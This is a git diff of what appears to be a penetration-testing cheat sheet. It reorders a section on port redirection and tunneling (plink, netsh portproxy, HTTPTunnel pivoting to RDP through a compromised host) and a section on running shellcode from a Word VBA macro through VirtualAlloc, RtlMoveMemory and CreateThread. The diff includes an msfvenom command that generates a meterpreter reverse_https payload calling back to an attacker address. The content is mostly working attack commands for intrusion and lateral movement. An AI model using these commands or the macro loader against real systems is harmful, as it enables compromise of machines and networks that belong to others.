@@ -962,48 +962,10 @@ Sub MyMacro()
 End Sub
 ```
 
-# Port Redirection and Tunneling
-## Plink
-* [plink](http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
-```
-plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.1:3306 10.10.10.10
-# avoid prompt 'Store key in cache?'
-cmd.exe /c echo y | plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.0:3306 10.10.10.10
-```
-
-## netsh
-```
-netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
-```
-## HTTPTunneling Through Deep Packet Inspection
-* [HTTPTunnel](http://http-tunnel.sourceforge.net/)
-
-Assuming the following setup:
-
-Attacker Machine (Kali): 10.10.10.10
-Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
-Windows Server: 192.168.1.100
-Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
-Objective: Get a RDP Session to the Windows Server
-
-1. Setup local forward on compromised machine
-```
-ssh -L 0.0.0.0:8888:192.168.1.100:3389
-```
-2. Setup HTTPTunnel server on compromised machine (hts)
-```
-hts --foward-port localhost:8888 4444
-```
-3. Setup HTTPTunnel client on attacker machine
-```
-htc --forward-port 8080 10.10.10.10:4444
-```
-4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)
-
-# Executing Shellcode in Word Memory
+## Executing Shellcode in Word Memory
 To execute shellcode in memory we will take use of the three Win32 API's
 
-## VirtualAlloc
+### VirtualAlloc
 
 Used to allocate memory. [Link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
 
@@ -1028,7 +990,7 @@ LPVOID VirtualAlloc(
 * Integers can be translated to ``Long``
 * dwSize can be hardcoded or set dynamically using ``UBound``: ``UBound(buf)``. [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function), also see ``LBound`` [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function)
 
-## RtlMoveMemory
+### RtlMoveMemory
 
 After allocating memory we must copy our desired shellcode bytes into this memory location (executable buffer). This is done using ``RtlMoveMemory``. 
 
@@ -1047,7 +1009,7 @@ VOID RtlMoveMemory(
 |length [Long]| length of shellcode to be copied (passed by value)|
 |return value [LongPtr]| memory pointer|
 
-## CreateThread
+### CreateThread
 After copying the shelcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
 
 ```
@@ -1071,14 +1033,14 @@ HANDLE CreateThread(
 * Most arguments are not needed and can be set o "0"
 * lpParameter can be "0" since our shellcode does not require arguments
 
-## Generate Shellcode
+### Generate Shellcode
 ```
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
 ```
 
 EXITFUNC=thread because our shell would be killed when office is closed, metasploit's AutoMigrade module would solve this also. 
 
-## Entire VBA Code
+### Entire VBA Code
 ```
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
@@ -1128,4 +1090,43 @@ To work as expected, this requires a matching 32-bit multi/handler in Metasploit
 
 
 
+
+
+# Port Redirection and Tunneling
+## Plink
+* [plink](http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
+```
+plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.1:3306 10.10.10.10
+# avoid prompt 'Store key in cache?'
+cmd.exe /c echo y | plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.0:3306 10.10.10.10
+```
+
+## netsh
+```
+netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
+```
+## HTTPTunneling Through Deep Packet Inspection
+* [HTTPTunnel](http://http-tunnel.sourceforge.net/)
+
+Assuming the following setup:
+
+Attacker Machine (Kali): 10.10.10.10
+Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
+Windows Server: 192.168.1.100
+Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
+Objective: Get a RDP Session to the Windows Server
+
+1. Setup local forward on compromised machine
+```
+ssh -L 0.0.0.0:8888:192.168.1.100:3389
+```
+2. Setup HTTPTunnel server on compromised machine (hts)
+```
+hts --foward-port localhost:8888 4444
+```
+3. Setup HTTPTunnel client on attacker machine
+```
+htc --forward-port 8080 10.10.10.10:4444
+```
+4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)
 
